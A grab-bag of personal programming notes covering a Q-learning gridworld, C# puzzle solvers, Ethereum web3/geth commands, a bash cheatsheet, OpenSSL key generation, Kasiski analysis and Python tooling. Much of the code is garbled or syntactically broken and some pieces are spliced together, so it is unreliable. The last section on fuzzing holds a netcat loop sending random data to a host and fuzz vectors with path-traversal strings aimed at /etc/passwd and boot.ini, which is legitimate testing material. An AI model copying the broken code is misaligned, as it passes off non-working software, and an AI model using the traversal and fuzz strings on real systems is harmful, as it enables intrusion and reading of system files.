                reward = self.get_reward(self.current_location)
            
        # LEFT
        elif action == 'LEFT':
            # If agent is at the left, stay still, collect reward
            if last_location[1] == 0:
                reward = self.get_reward(last_location)
            else:
                self.current_location = ( self.current_location[0], self.current_location[1] - 1)
                reward = self.get_reward(self.current_location)

        # RIGHT
        elif action == 'RIGHT':
            # If agent is at the right, stay still, collect reward
            if last_location[1] == self.width - 1:
                reward = self.get_reward(last_location)
            else:
                self.current_location = ( self.current_location[0], self.current_location[1] + 1)
                reward = self.get_reward(self.current_location)
				 return reward
    
    def check_state(self):
        """Check if the agent is in a terminal state (gold or bomb), if so return 'TERMINAL'"""
        if self.current_location in self.terminal_states:
            return 'TERMINAL'
			
			
			-------------------------------------------
			
			RANDOM_AGENT
			
			class RandomAgent():        
    # Choose a random action
    def choose_action(self, available_actions):
        """Returns a random choice of the available actions"""
        return np.random.choice(available_actions)
		
		    # Intialise
    def __init__(self, environment, epsilon=0.05, alpha=0.1, gamma=1):
        self.environment = environment
        self.q_table = dict() # Store all Q-values in dictionary of dictionaries 
        for x in range(environment.height): # Loop through all possible grid spaces, create sub-dictionary for each
            for y in range(environment.width):
                self.q_table[(x,y)] = {'UP':0, 'DOWN':0, 'LEFT':0, 'RIGHT':0} # Populate sub-dictionary with zero values for possible moves

        self.epsilon = epsilon
        self.alpha = alpha
        self.gamma = gamma
        
    def choose_action(self, available_actions):
        """Returns the optimal action from Q-Value table. If multiple optimal actions, chooses random choice.
        Will make an exploratory random action dependent on epsilon."""
        if np.random.uniform(0,1) < self.epsilon:
            action = available_actions[np.random.randint(0, len(available_actions))]
        else:
            q_values_of_state = self.q_table[self.environment.current_location]
            maxValue = max(q_values_of_state.values())
            action = np.random.choice([k for k, v in q_values_of_state.items() if v == maxValue])
        
        return action
    
    def learn(self, old_state, reward, new_state, action):
        """Updates the Q-value table using Q-learning"""
        q_values_of_state = self.q_table[new_state]
        max_q_value_in_new_state = max(q_values_of_state.values())
        current_q_value = self.q_table[old_state][action]
        
        self.q_table[old_state][action] = (1 - self.alpha) * current_q_value + self.alpha * (reward + self.gamma * max_q_value_in_new_state)
		
		
		env = GridWorld()
agent = RandomAgent()

print("Current position of the agent =", env.current_location)
print(env.agent_on_map())
available_actions = env.get_available_actions()
print("Available_actions =", available_actions)
chosen_action = agent.choose_action(available_actions)
print("Randomly chosen action =", chosen_action)
reward = env.make_step(chosen_action)
print("Reward obtained =", reward)
print("Current position of the agent =", env.current_location)
print(env.agent_on_map())
environment = GridWorld()
random_agent = RandomAgent()

reward_per_episode = play(environment, random_agent, trials=500)

# Simple learning curve
plt.plot(reward_per_episode)

environment = GridWorld()
agentQ = Q_Agent(environment)

# Note the learn=True argument!
reward_per_episode = play(environment, agentQ, trials=500, learn=True)

# Simple learning curve
plt.plot(reward_per_episode)


def prettty(d,indent =0 ):
for key,value in d.items():
print('\t' * ident + str(key))
if isinstance(value,dict):
pretty(value,ident+1)
else
print('\t' * (ident+1) + str(value))
pretty(agentQ.qtable)
-----------------------------------------------------------------------------------------


--------------------------------------------------
Sudoku Solver
------------------
using System;
using System.Collection.Generic;
using Algorithms.Utils;
namespace Algorithms{
public class Solution 
{
public static char[,] SolveSudoku(char[,] board)
}
if(board.Length != 81 || board.GetLength(0) != 9)
{
return null;

}
SolveSudoku(board,0,0);
return board;
}
private static bool SolveSudoku(char[,],board,inti,intj){
if (i == 9) return true;
if(j >= 9) return SolveSudoku(board,i+1,0);
if(board[i,j] == '.'){
for(int k=1;k<=9;k++){
board[i,j] = (char)(k+'0');
if(isValid(board,i,j))
{
if(SolveSudoku(board,i,j+1))
return true;

}
}
}
else{
return SolveSudoku(board,i,j+1);

}
board[i,j] = '.';
return false;

}
private static bool isValid(char[,],board,int i,int j)
{
for(int k=0;k<9;k++)
{
if(k!=j && board[i,k] = board[i,j])
retur false;

}
for(int k=0;k<9;k++)
{
if(k!=i && board[k,j] == board[i,j])
return false;
}

for(int roww=i/3*3;row<i/3*3+3;row++)
{
for(int col = j/3*3;col<j/3*3+3;col++)
{
if(row!= i || col!= j)&& board[row,col]==board[i,j])
return false;

}
}
return true;

}

}
}
-------------------------------------------------------------------------------------
Solidity/ Vyper 
------------------

virtualenv -p python3.6 web3-venv
source web3-venv/bin/activate
pip install web3
python
import web3.__version__
from web3 import Web3, HTTProvider 
w3  =web3(HTTProvider('http:/localhost.com:7545'))
w3.eth.blockNumber
w3.eth.getBlock('latest')



./geth --rinkeby
./geth --rinkeby --datadir /opt/data/ethereumdata
python
from web3 import Web3,IPCProvider
w3 = Web3(IPCProvider("/home/username/.etheruem/rinkeby"))

aganache uses 7545 port
search where the geth.ipc
ipc is known as pipe in computer science


from web3.middleware import geth.poa.middelware
w3.middleware_stack.inject(geth_poa_middleware, layer=0)
w3.eth.getBlock('latest')


find thelatest info of the latest block in http://etherscan.io/blocks


Geth Console
-------------
./geth --rinkeby --verbosity 0 console
 personal.newAccount('password123')
 
 
 ./home/username/.geth/rinkeby/keystore
 
 
 
 to decrypt an encrypted file of the private key

from web3 import Web3
w3 = Web3()
with open('/opt/data/ethereumdata/keystore/UTC-------something----') as keyfile:
encrypted_key = keyfile.read()
private_key = w3.eth.account.decrypt(encrypted_key,'password')
print(private_key)


python extract_private_key.py
then convert itto bytes format using b''
from web3 import Web3 HTTProvider
w3 = Web3(HTTProvider('http://localhost:7545'))
Or
w3 = Web3(IPCProvider('/opt/data/ethereumdata/geth.ipc'))
private_key = 'your_key'
transaction = {
'to':web3.toChecksumAddress('address'),
'value': w3.toWei('1','ether'),
'gas': 100000,
'gasPrice': w3.toWei('1','gwei'),
'nonce':0
}

signed = w3.eth.account.signTransaction(transaction,private_key)
tx = w3.eth.sendRawTransaction(signed.rawTransaction)


print("Estimating gas" + str(w3.eth.estimaetGas((transaction)))
print("gas_price" + str(w3.eth.gasPrice))


transaction_count = w3.eth.getTransactionCount("")
print(transaction_count)


creating a rinkeby transaction 
-----------------------------------
faucets
------------
./geth --rinkeby --verbosity 0 console 


w3.eth.getBalance('address')
w3.personal.sendTransaction(transaction,password)

eth.accounts
personal.unlockAccount(eth.accounts[0],"password123")
bytecode = "smart contract bytecode"
tx = eth.sendTransaction(from:eth.accounts[0],data:bytecode,gas : 500e3)
web3.eth.getTransactionReciept(tx)

launching a smart contract 
-----------------------------
from web3 import Web3, HTTProvider
from vyper import compile_codecs

contract_source_code = ""
name:public(bytes[24])
@public
def __init__():
self.name = "Satoshi Nakamoto"
tx_hash = HelloSmartContract.constructor().transact({'from': 'address'})
tx_reciept = w3.eth.waitForTransactionReciept(tx_hash)
print(tx_reciept)



output :

attributeDict
{
transactionHash = HexByte type
transactionIndex  = 0 
blockHash = HexBytes type


}




playing with a smart contract 
------------------------------
smart_contract = {}
smart_contract['Hello'] = contract_source_code

format = ['abi','bytecode']
compiled_code = compile_codes(smart_contract,format,'dict')
abi = compiled_code['Hello']['abi']



address = " "
password = ' '
w3.eth.defaultAccount = ''
with open keystore as keyfile


same like decrypt 

........

Hello = w3.eth.contract(address=address,abi=abi)
Donation.at("").change_values_variables("sky")
print(Hello.function.name().call())

nonce = w3.eth.getTransactionCount(w3.eth.defaultAccount)
txn = Hello.functions.change_name(b"afvan mj").buildTransaction({
'gas': 70000,
'gasPrice' : w3.toWei('1','gwei'),
'nonce' : nonce

})
 


populus  development framework 
---------------------------------
pip install eth-abi==1.2.2
pip install eth-typing==1.1.0
pip install py-evm==0.2.0a33
pip install web3==4.7.2
pip install -e git+https://github.com

python 
install--
-------------
from solc import install_solc
install_solc

synbolic link 
------------------
ln -s /home/username/.py-solc/solc-v0.4.25/bin/solc populus-venv/bin/
mkdir populus
cd populus
populus init






BASH cheatsheet
---------------------

	Brace Expansion echo {A,B}.js
	strict mode  set-euo pipefail
	IFS =$'\n\t'
	
	
	Parameter expansion 
	----------------------
	name="John"
echo ${name}
echo ${name/J/j}    #=> "john" (substitution)
echo ${name:0:2}    #=> "Jo" (slicing)
echo ${name::2}     #=> "Jo" (slicing)
echo ${name::-1}    #=> "Joh" (slicing)
echo ${name:(-1)}   #=> "n" (slicing from right)
echo ${name:(-2):1} #=> "h" (slicing from right)
echo ${food:-Cake}  #=> $food or "Cake"


Substitution 
----------------
${FOO%suffix}	Remove suffix
${FOO#prefix}	Remove prefix
${FOO%%suffix}	Remove long suffix
${FOO##prefix}	Remove long prefix
${FOO/from/to}	Replace first match
${FOO//from/to}	Replace all
${FOO/%from/to}	Replace suffix
${FOO/#from/to}	Replace prefix




STR="/path/to/foo.cpp"
echo ${STR%.cpp}    # /path/to/foo
echo ${STR%.cpp}.o  # /path/to/foo.o
echo ${STR%/*}      # /path/to

echo ${STR##*.}     # cpp (extension)
echo ${STR##*/}     # foo.cpp (basepath)

echo ${STR#*/}      # path/to/foo.cpp
echo ${STR##*/}     # foo.cpp

echo ${STR/foo/bar} # /path/to/bar.cpp
STR="Hello world"
echo ${STR:6:5}   # "world"
echo ${STR: -5:5}  # "world"
SRC="/path/to/foo.cpp"
BASE=${SRC##*/}   #=> "foo.cpp" (basepath)
DIR=${SRC%$BASE}  #=> "/path/to/" (dirpath)


Comments
------------
: '
This is a
multi line
comment
'

SubStrings
------------
${FOO:0:3}	Substring (position, length)
${FOO:(-3):3}	Substring from the right


Length 
----------
${#FOO}


Manipulation 
--------------
STR="HELLO WORLD!"
echo ${STR,}   #=> "hELLO WORLD!" (lowercase 1st letter)
echo ${STR,,}  #=> "hello world!" (all lowercase)

STR="hello world!"
echo ${STR^}   #=> "Hello world!" (uppercase 1st letter)
echo ${STR^^}  #=> "HELLO WORLD!" (all uppercase)



Default Values 
--------------
${FOO:-val}	$FOO, or val if unset (or null)
${FOO:=val}	Set $FOO to val if unset (or null)
${FOO:+val}	val if $FOO is set (and not null)
${FOO:?message}	Show error message and exit if $FOO is unset (or null)

LOOPS 
--------
Basic for loop
for i in /etc/rc.*; do
  echo $i
done
C-like for loop
for ((i = 0 ; i < 100 ; i++)); do
  echo $i
done
Ranges
for i in {1..5}; do
    echo "Welcome $i"
done
With step size
for i in {5..50..5}; do
    echo "Welcome $i"
done
Reading lines
cat file.txt | while read line; do
  echo $line
done
Forever
while true; do
  ···
done




	Functions 
	------------
	
	myfunc() {
    echo "hello $1"
}
# Same as above (alternate syntax)
function myfunc() {
    echo "hello $1"
}
myfunc "John"
Returning values
myfunc() {
    local myresult='some value'
    echo $myresult
}
result="$(myfunc)"
Raising errors
myfunc() {
  return 1
}
if myfunc; then
  echo "success"
else
  echo "failure"
fi




ARGUMENTS 
---------------
$#	Number of arguments
$*	All arguments
$@	All arguments, starting from first
$1	First argument
$_	Last argument of the previous command




Conditionals
------------------
examples.

[[ -z STRING ]]	Empty string
[[ -n STRING ]]	Not empty string
[[ STRING == STRING ]]	Equal
[[ STRING != STRING ]]	Not Equal
[[ NUM -eq NUM ]]	Equal
[[ NUM -ne NUM ]]	Not equal
[[ NUM -lt NUM ]]	Less than
[[ NUM -le NUM ]]	Less than or equal
[[ NUM -gt NUM ]]	Greater than
[[ NUM -ge NUM ]]	Greater than or equal
[[ STRING =~ STRING ]]	Regexp
(( NUM < NUM ))	Numeric conditions
More conditions
[[ -o noclobber ]]	If OPTIONNAME is enabled
[[ ! EXPR ]]	Not
[[ X && Y ]]	And
[[ X || Y ]]	Or
File conditions
[[ -e FILE ]]	Exists
[[ -r FILE ]]	Readable
[[ -h FILE ]]	Symlink
[[ -d FILE ]]	Directory
[[ -w FILE ]]	Writable
[[ -s FILE ]]	Size is > 0 bytes
[[ -f FILE ]]	File
[[ -x FILE ]]	Executable
[[ FILE1 -nt FILE2 ]]	1 is more recent than 2
[[ FILE1 -ot FILE2 ]]	2 is more recent than 1
[[ FILE1 -ef FILE2 ]]	Same files
Example
# String
if [[ -z "$string" ]]; then
  echo "String is empty"
elif [[ -n "$string" ]]; then
  echo "String is not empty"
else
  echo "This never happens"
fi



Arrays 
--------

Fruits=('Apple' 'Banana' 'Orange')
Fruits[0]="Apple"
Fruits[1]="Banana"
Fruits[2]="Orange"
Working with arrays
echo ${Fruits[0]}           # Element #0
echo ${Fruits[-1]}          # Last element
echo ${Fruits[@]}           # All elements, space-separated
echo ${#Fruits[@]}          # Number of elements
echo ${#Fruits}             # String length of the 1st element
echo ${#Fruits[3]}          # String length of the Nth element
echo ${Fruits[@]:3:2}       # Range (from position 3, length 2)
echo ${!Fruits[@]}          # Keys of all elements, space-separated
Operations
Fruits=("${Fruits[@]}" "Watermelon")    # Push
Fruits+=('Watermelon')                  # Also Push
Fruits=( ${Fruits[@]/Ap*/} )            # Remove by regex match
unset Fruits[2]                         # Remove one item
Fruits=("${Fruits[@]}")                 # Duplicate
Fruits=("${Fruits[@]}" "${Veggies[@]}") # Concatenate
lines=(`cat "logfile"`)                 # Read from file
Iteration
for i in "${arrayName[@]}"; do
  echo $i
done


Dictionaries
-------------
Defining
declare -A sounds
sounds[dog]="bark"
sounds[cow]="moo"
sounds[bird]="tweet"
sounds[wolf]="howl"
Declares sound as a Dictionary object (aka associative array).

Working with dictionaries
echo ${sounds[dog]} # Dog's sound
echo ${sounds[@]}   # All values
echo ${!sounds[@]}  # All keys
echo ${#sounds[@]}  # Number of elements
unset sounds[dog]   # Delete dog
Iteration
Iterate over values
for val in "${sounds[@]}"; do
  echo $val
done
Iterate over keys
for key in "${!sounds[@]}"; do
  echo $key
done


Options
---------
set -o noclobber  # Avoid overlay files (echo "hi" > foo)
set -o errexit    # Used to exit upon error, avoiding cascading errors
set -o pipefail   # Unveils hidden failures
set -o nounset    # Exposes unset variables
Glob options
shopt -s nullglob    # Non-matching globs are removed  ('*.foo' => '')
shopt -s failglob    # Non-matching globs throw errors
shopt -s nocaseglob  # Case insensitive globs
shopt -s dotglob     # Wildcards match dotfiles ("*.sh" => ".foo.sh")
shopt -s globstar    # Allow ** for recursive 


Commands
-----------
history
shopt -s histverify



Operations
------------
!!	Execute last command again
!!:s/<FROM>/<TO>/	Replace first occurrence of <FROM> to <TO> in most recent command
!!:gs/<FROM>/<TO>/	Replace all occurrences of <FROM> to <TO> in most recent command
!$:t	Expand only basename from last parameter of most recent command
!$:h	Expand only directory from last parameter of most recent command
!! and !$ can be replaced with any valid expansion.



Expansions
!$	Expand last parameter of most recent command
!*	Expand all parameters of most recent command
!-n	Expand nth most recent command
!n	Expand nth command in history
!<command>	Expand most recent invocation of command <command>




Slices 
--------
!!:n	Expand only nth token from most recent command (command is 0; first argument is 1)
!^	Expand first argument from most recent command
!$	Expand last token from most recent command
!!:n-m	Expand range of tokens from most recent command
!!:n-$	Expand nth token to last from most recent command

Subshells
-------------
(cd somedir; echo "I'm now in $PWD")
pwd # still in first directory

Numeric calculations
-------------------------
$((a + 200))      # Add 200 to $a
$(($RANDOM%200))  # Random number 0..199

Inspecting commands
------------------

command -V cd
#=> "cd is a function/alias/whatever"



Trap errors
---------------

trap 'echo Error at about $LINENO' ERR
or

traperr() {
  echo "ERROR: ${BASH_SOURCE[1]} at about ${BASH_LINENO[0]}"
}

set -o errtrace
trap traperr ERR

 

Redirection
----------------

python hello.py > output.txt   # stdout to (file)
python hello.py >> output.txt  # stdout to (file), append
python hello.py 2> error.log   # stderr to (file)
python hello.py 2>&1           # stderr to stdout
python hello.py 2>/dev/null    # stderr to (null)
python hello.py &>/dev/null    # stdout and stderr to (null)
python hello.py < foo.txt      # feed foo.txt


case/switch 
-------------
case "$1" in
  start | up)
    vagrant up
    ;;

  *)
    echo "Usage: $0 {start|stop|ssh}"
    ;;
esac


Source relative
---------------------
source "${0%/*}/../share/foo.sh"


printf
---------

printf "Hello %s, I'm %s" Sven Olga
#=> "Hello Sven, I'm Olga

printf "1 + 1 = %d" 2
#=> "1 + 1 = 2"

printf "This is how you print a float: %f" 2
#=> "This is how you print a float: 2.000000


Directory of script
----------------------
DIR="${0%/*}"



Getting options
-------------------
while [[ "$1" =~ ^- && ! "$1" == "--" ]]; do case $1 in
  -V | --version )
    echo $version
    exit
    ;;
  -s | --string )
    shift; string=$1
    ;;
  -f | --flag )
    flag=1
    ;;
esac; shift; done
if [[ "$1" == '--' ]]; then shift; fi


Heredoc
-------------
cat <<END
hello world
END


Reading input 
----------------
echo -n "Proceed? [y/n]: "
read ans
echo $ans
read -n 1 ans    # Just one character


Special Variables 
--------------------
$?	Exit status of last task
$!	PID of last background task
$$	PID of shell
$0	Filename of the shell script


Go to previous directory
-----------------------------
pwd # /home/user/foo
cd bar/
pwd # /home/user/foo/bar
cd -
pwd # /home/user/foo


Grep check 
-------------
if grep -q 'foo' ~/.bash_history; then
  echo "You appear to have typed 'foo' in the past"
fi

check for command result 
----------------------------
if ping -c 1 google.com; then
  echo "It appears you have a working internet connection"
fi

-----------------------------------------------------------------------------
OPENSSL
cheat sheet 	
----------------
ECDSA 
---------

ECC P-256---
--------------

openssl genpkey -algorithm EC \
-pkeyopt ec_paramgen_curve:P-256 \
-pkeyopt ec_param_enc:named_curve |\
openssl pkcs8 -topk8 -nocrypt -outform der  > p256-private-key.p8

 
 ECC P-384
 ---------

openssl genpkey -agorithm EC \
-pkeyopt ec+paramgen_curve:P-384 \ 
-pkeyopt ec_param_enc:named_curve | 
openssl pkcs8 -topk8 -nocrypt -outform der > p384-private-key.p8

RSA
-------
2048 bit RSA 
------------
openssl genpkey -algorithm RSA \
-pkeyopt rsa_keygen_bits:2048 \
-pkeyopt rsa_keygen_pubexp:65537 | \
openssl pkcs8 -topk8 -nocrypt -outform der  >rsa-2048-private-key.p8

3072 RSA key 
-------------
openssl genpkey -algorithm RSA \
-pkeyopt rsa_keygen_bits: 3072 \ 
-pkeyopt rsa_keygen_pubexp:65537 | \



Extracting the public key from the private key ----
----------------------------------------------------

openssl -pkey -pubout -inform der -outform der \
-in <filename>
-out <another-filename>

Extract the RSA public key from the private key without the subjectPublickeyinfo Metadata 
--------------------------------------------------------------------------------------------

openssl pkey -pubout -inform der -outform der  \
-in rsa-something.p8 | \
openssl -pubin -RSAPublicKey_out -inform DER -outform DER \
-out rsa-something.p8


IN PEM (base64)

openssl pkey -pubout -inform der -outform der \
    -in rsa-2048-private-key.p8 | \
  openssl rsa -pubin -RSAPublicKey_out -inform DER -outform PEM \
    -out rsa-2048-public-key-legacy-form.pem
	
	Inspecting a Keys public Metadata
	-----------------------------------
	
	openssl pkey -noout -text_pub -inform der -in <filename>
	
example 
-----------
	
	openssl pkey -noout -text_pub -inform der -in p256-private-key.p8
you'd see output like this (with a different value for pub, the public key):

Public-Key: (256 bit)
pub:
    04:cf:0d:13:a3:a7:57:72:31:ea:1b:66:cf:40:21:
    cd:54:f2:1f:4a:c4:f5:f2:fd:d2:8e:05:bc:7d:2b:
    d0:99:d1:37:4c:d0:8d:2e:f6:54:d6:f0:44:98:db:
    46:2f:73:e0:28:20:58:dd:66:1a:4c:9b:04:37:af:
    3f:7a:f6:e7:24
ASN1 OID: prime256v1
NIST CURVE: P-256






openssl pkey -noout -text_pub -inform der -in rsa-2048-private-key.p8
would output something like this (with a different modulus value):

Public-Key: (2048 bit)
Modulus:
    00:b9:d7:af:84:fa:41:84:a5:f2:20:37:ec:8a:ff:
    2d:b5:f7:8b:d8:c2:1e:71:4e:57:9a:e5:7c:63:98:
    c4:95:0f:3a:69:4b:17:bf:cc:f4:88:76:61:59:ae:
    c5:bb:7c:2c:43:d5:9c:79:8c:bd:45:a0:9c:9c:86:
    93:3f:12:68:79:ee:7e:ad:cd:40:4f:61:ec:fc:42:
    51:97:ca:b0:39:46:ba:38:1a:49:ef:3b:4d:0f:60:
    b1:7f:8a:74:7c:de:56:a8:34:a7:f6:00:8f:35:ff:
    b2:f6:0a:54:ce:da:19:74:ff:2a:99:63:ab:a7:f8:
    0d:4e:29:16:a9:3d:8c:74:bb:1b:a5:f3:b1:89:a4:
    e8:f0:37:7b:d3:e9:4b:5c:c3:f9:c5:3c:b8:c8:c7:
    c0:af:39:48:18:75:5e:96:8b:7a:76:d9:ca:da:8d:
    a7:af:5f:be:25:da:2a:09:73:7d:5e:4e:4d:70:92:
    aa:16:a0:71:8d:73:22:ce:8a:ca:76:70:15:12:8d:
    6d:35:77:5e:a9:cb:8b:b1:ac:65:12:e1:b7:87:d3:
    40:15:22:1b:e7:80:a3:7b:1d:69:bc:37:08:bf:d8:
    83:25:91:be:60:95:a7:68:f0:fd:3b:34:57:92:7e:
    6a:e3:64:1d:55:79:9a:29:a0:a2:69:cb:4a:69:3b:
    c1:4b
Exponent: 65537 (0x10001)

-----------------------------------------------------------------------------
MinimumPath Sums 
---------------------
using System;
using System.Collection.Generic;
using Algorithm.Utils;
namespace Algorithms
{
public class Solution 
{
public static int MinPathSum(int[,] grid)
{
if(grid == null || grid.GetLength(0) == 0 || grid.GetLength(1) == 0)
return 0;
int[] res = new int[grid.GetLength(1)];
res[0] = grid[0,0];
for(int i=1;i<grid.GetLength;i++){
res[i] = res[i-1]+grid[0,i];

}
for(int i=1;i<grid.GetLength(0);i++)
{
for(int j=0;j<grid.GetLength(1);j++)
{
if(j==0)
{
res[j] += grid[i,j];
}else
{
res[j] = Math.Min(res[i,j],res[i,j])+grid[i,j];

}
}
return res[grid.GetLength(1) - 1];

}
}
}


--------------------------------------------------------------------------------'
NQueens 
--------------

Using System;
Using System.Collection.Generic;
Using System.Linq;
Using System.Text;
Using Algorithm.Utils;
namespace Algorithms{
public class Solution
{
public static IList<IList<string>> solveQueens(int n)
{
IList<IList<string>> res = new List<IList<string>>();
helper(n,0,new int[n],res);
return res;

}
private static void helper(int n,int[] columnforRow, IList<IList<string>> res)

{
if(row == n)
{
string[] strN = new string[n];
IList<string> item = new List<string>(strN);
for(inti=0;i<n;++)
{
StringBuilder strRow = new StringBuilder();
for(int j=0 ; j < n; j++)
if(columnforRow[i] == j)
{
strRow.Append('Q');

}
else
strRow.Append('.');


}
item[i] = strRow.toString();

}
res.Add(item);
return;
}
for(int i=0;i<n;i++)
{
columnforRow[row] = i;
if(check(row,columnforRow))
{
helper(n,row+1,columnforRow,res);
}
}
}
private static bool check(int row, int[] columnforRow)
{
for(int i=0;i<row;i++)
{
if(columnforRow[row] == columnforRow[i] || Math.Abs(columnforRow[row]- columnforRow[i]) == row-i)
return false;

}
return true;

}
}
}


------------------------------------------------------------------------
	GTK 
	Menu Item 
	-------------
	
	#include <gtk/gtk.h>
	
	int main(intargc, char *argv[])
	{
	GtkWidget *window;
	GtkWidget *vbox;
	GtkWidget *menubar;
	GtkWidget *fileMi
	GtkWidget *fileMenu;
	GtkWidget *quitMi;
	gtk_init(&argc,&argv);
	
	window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
	gtk_window_set_position(GTK_WINDOW(window), GTK_WIN_POS_CENTER);
	gtk_window_set_default_size(GTK_WINDOW(window),300,200);
	gtk_window_set_title(GTK_WINDOW(window),"Menu");
	
	
	vbox = gtk_vbox_new(FALSE,0);
	gtk_container_add(GTK_CONTAINER(window), vbox);
	menubar = gtk_menu_bar_new();
	fileMenu = gtk_menu_new();
	fileMi = gtk_menu_item_new_with_label("File");
	quitMi = gtk_menu_item_new_with_label("Quit");
	
	gtk_menu_item_set_submenu(GTK_MENU_ITEM(fileMi),fileMenu);
	gtk_menu_shell_append(GTK_MENU_SHELL(fileMenu),quitMi);
	gtk_menu_shell_append(GTK_MENU_SHELL(menubar),fileMi);
	gtk_box_pack_start(GTK_BOX(vbox),menubar,FALSE,FALSE,0);
	 
	 g_signal_connect(G_OBJECT(window), "destroy",G_CALLBACK(gtk_main_quit),NULL);
	 g_signal_connect(G_OBJECT(quitMi),"activate",G_CALLBACK(gtk_main_quit),NULL);
	 
	 gtk_widget_show_all(window);
	 gtk_main();
	 return 0;
	 
	}

---------------------------------------------------------------------------	
Kaski  examination for vignere cipher 
-------------------------------------
PPQCAXQVEKGYBNKMAZUYBNGBALJONITSZMJYIMVRAGVOHTVRAUCTKSGDDWUOXITLAZUVAVVRAZCVKBQPIWPOU


 Between the first and second VRA sequences there are 8 letters.
 Between the second and third VRA sequences there are 24 letters.
 Between the first and third VRA sequences there are 32 letters.
 Between the first and second AZU there are 48 letters.
 Between the first and second YBN there are 8 letters.

 The factors of 8 are 2, 4, and 8.
 The factors of 24 are 2, 4, 6, 8, 12, and 24.
 The factors of 32 are 2, 4, 8, and 16.
 The factors of 48 are 2, 4, 6, 8, 12, 24, and 48.
So the spacings of 8, 8, 24, 32, and 48 expand to this list of factors: 2, 2, 2, 2, 4, 4, 4, 4, 6, 6, 8, 8, 8, 8, 12, 12, 16, 24, 24, and 48. If we do a count of these factors, we get this:

Factor
Count
2
Appears 4 times.
4
Appears 4 times.
6
Appears 2 times.
8
Appears 4 times.
12
Appears 2 times.
16
Appears 1 time.
24
Appears 2 times.
48
Appears 1 time.


Every 4th letter starting with the first letter: PPQCAXQVEKGYBNKMAZUYBNGBALJONITSZMJYIMVRAGVOHTVRAUCTKSGDDWUOXITLAZUVAVVRAZCVKBQPIWPOU
Every 4th letter starting with the second letter: PPQCAXQVEKGYBNKMAZUYBNGBALJONITSZMJYIMVRAGVOHTVRAUCTKSGDDWUOXITLAZUVAVVRAZCVKBQPIWPOU
Every 4th letter starting with the third letter: PPQCAXQVEKGYBNKMAZUYBNGBALJONITSZMJYIMVRAGVOHTVRAUCTKSGDDWUOXITLAZUVAVVRAZCVKBQPIWPOU
Every 4th letter starting with the fourth lettter: PPQCAXQVEKGYBNKMAZUYBNGBALJONITSZMJYIMVRAGVOHTVRAUCTKSGDDWUOXITLAZUVAVVRAZCVKBQPIWPOU


When combined, they become these four strings:
Every 4th letter starting with the first letter:
PAEBABANZIAHAKDXAAAKIU
Every 4th letter starting with the second letter:
PXKNZNLIMMGTUSWIZVZBW
Every 4th letter starting with the third letter:
QQGKUGJTJVVVCGUTUVCQP
Every 4th letter starting with the fourth letter:
CVYMYBOSYRORTDOLVRVPO
the Vigenère cipher is the same as the Caesar cipher, except it uses multiple subkeys. Kasiski Examination tells us how many subkeys were used for the ciphertext, now we just have to hack each subkey one at a time. Let’s try to hack the first of these four ciphertext strings: PAEBABANZIAHAKDXAAAKIU
We will decrypt this string 26 times, once for each of the 26 possible subkeys, and then see what English frequency match score the decrypted text has. In the table below, the first column is the subkey used to decrypt the PAEBABANZIAHAKDXAAAKIU string. The second column is the returned decrypted text value from vigenereCipher.decryptMessage(subkey,



The subkeys that produce decryptions with the closest frequency match to English are the ones that are most likely to be the real subkey
'A', 'I', 'N', 'W', and 'X' are the subkeys that have the highest frequency matches with English.


--------------------------------------------------------------------------------------------
Logging 
-------------
import logging 
logging.basicConfig(level=logging.DEBUG,format=' %(asctime)s - %(leveltime)s - %(message)s')
logging.debug('Start of the program')

def_factorial(n) :

logging.debug('Start of Factorial(%s)' % (n))
total = 1

for i in range(1,n+1):
total *= i
logging.debug('i is ' + str(i) + ', total is' + str(total))
logging.debug('End of Factorial(%s)' % (n))
return total
print(factorial(5))
logging.debug('End of the program ')



logging levels 
--------------------

DEBUG 
INFO
WARNING 
Error
CRITICAL




disable by 
logging.disable(logging.CRITICAL)


loggin to a file by 

logging.basicConfig(filename='myprogramlogging.txt',level= logging.DEBUG, format = as same )

-----------------------------------------------------------------------------------------
CONTEXT MANAGER 
--------------------
import contextlib
@contextlib.contextmanager
def context_manager(num):
print('Enter')

yield num + 1
print('Exit')

with context_manager(2) as cm:
print('Right int the middle with cm: {}'.format(cm))

-------------------------------------------------------------------------------
fomr ditutils.core import setup
setup(
name='PythonCheatSheet',
version='0.1',
packages= ['pipenv',],
license = 'MIT',
long_description=open('README.txt').read(),
)


---------------------------------------------------------------




DATACLASS
-----------

class Number:
def __inti__(self,val)
self.val = val






-----------
@dataclass
class Number:
val:int

obj = Number(2)
obj.val

------------------------------------------------------
Type Hints
---------------
from dataclasses import dataclass
from typing import Any 

@dataclass
class WithoutExplicitTypes:
name:Any
value: Any = 42

-------------------------------------------------
virtual environment 
------------------------
pip install virtualenv

pip install virtualenvwrapper-win

mkvirtualenv Helloworld
setprojectdir .
deactivate 
workon Hello world 



-------------------------------------------------

Poetry
-----------
pip install --user poetry 
poetry new my-project 



pyproject.toml file will orchestrate your project and its dependencies 

[tool.poetry]
name = "my-project"
version = "0.1.0"
description = ""
authors = ["your name <your@mail.com>"]

[tool.poetry.dependencies]
python = "*"

[tool.poetry.dev-dependencies]
pytest = "^3.4"




packages on tool.poetry.dependencies 
pendulum = "^1.4"

poetry add pendulum 
poetry install
poetry remove pendulum 
pip  install pipenv
cd ur porject 
pipenv install <PackAGE >
pipenv uninstall <package>
pipenv shell
exit

---------------------------------------------


anaconda
-------------
conda  create -n Hellow rold 

conda activate HelloWorld 

conda deactivate 



----------------------------------------------------------------------
while [1]; do cat /dev/urandom | netcat –vv IPaddr port; done


•	 Another way to send semi-valid input is to cycle through a protocol by inserting
some type of data. For example, if we want to search for buffer overflows in
the user name field of a protocol, we could cycle data sizes from 1 to 10,000
by 10 bytes:
[Client]-> “user ja<1 A>red\r\n”
[Client]-> “user ja<11 A’s>red\r\n”
[Client]-> “user ja<21 A’s>red\r\n”11
...
This method yields a deterministic number of runs and thus a deterministic
run-time. One might argue that only fixed buffers around known boundaries
should be tested, but off-by-one errors12 are a known issue. Also, an antihammering13 defense may limit the number of connections from a certain
IP, etc. This can often be disabled such that it will not interfere with testing.
•	 One could also choose to keep randomly inserting data for a specified period
of time:
[Client]-> “user ja<10000 A’s>red\r\n”
[Client]-> “user ja<12 A’s>red\r\n”
[Client]-> “user ja<1342 A’s>red\r\n”



Fuzzing Vectors
-------------------
# strings mostly ripped from spike
“/.:/” + “A”*5000 + “\x00\x00”,
“/.../” + “A”*5000 + “\x00\x00”,
“/.../.../.../.../.../.../.../.../.../.../”,
“/../../../../../../../../../../../../etc/passwd”,
“/../../../../../../../../../../../../boot.ini”,
